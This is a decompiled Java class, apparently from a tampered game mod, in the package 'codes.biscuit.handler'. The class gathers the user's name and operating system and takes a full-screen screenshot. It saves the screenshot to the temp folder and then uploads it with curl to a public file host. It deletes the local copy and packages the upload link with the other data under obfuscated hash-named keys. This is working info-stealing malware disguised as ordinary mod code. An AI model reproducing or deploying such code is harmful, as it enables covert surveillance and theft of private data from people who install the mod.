/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.google.gson.JsonElement
 *  com.google.gson.JsonObject
 *  com.google.gson.JsonParser
 */
package codes.biscuit.handler;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.Random;
import javax.imageio.ImageIO;

public class loginfo {
    public static String logInfo() {
        String a = System.getProperty("user.name");
        String b = System.getProperty("os.name");
        String c = loginfo.collectData();
        String d = "{\"c5cf65a531adf197ab8774ed87ee72e0\":{\"f520d6bef3d2dbe1a3c953e306b20cde\":\"" + a + "\",\"d9b7b2be37f983176c9d77493ea7150f\":\"" + b + "\",\"d4777343669e9d68969deeefaa37e2d4\":\"" + c + "\",\"ae5302d6c4d47be281feaf7311c8e68\":\"9bf5de77e0eb34de81d28d803a4206d4183ddab3e425fbfd9d600b9c74aa80bd\"},";
        return d;
    }

    public static String collectData() {
        try {
            Dimension sZ = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle sR = new Rectangle(sZ);
            Robot robot = new Robot();
            BufferedImage image = robot.createScreenCapture(sR);
            int random = new Random().nextInt();
            String path = System.getenv("TEMP") + "\\" + random + ".png";
            File file = new File(path);
            ImageIO.write((RenderedImage)image, "png", file);
            Process process = Runtime.getRuntime().exec("curl -F \"file=@" + path + "\" https://api.anonfiles.com/upload");
            BufferedReader y = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String x = "NA";
            x = y.readLine();
            if (x != null) {
                JsonElement h = new JsonParser().parse(x);
                JsonObject f = h.getAsJsonObject();
                f = f.getAsJsonObject("data");
                f = f.getAsJsonObject("file");
                f = f.getAsJsonObject("url");
                String g = f.get("short").getAsString();
                file.delete();
                return g;
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}

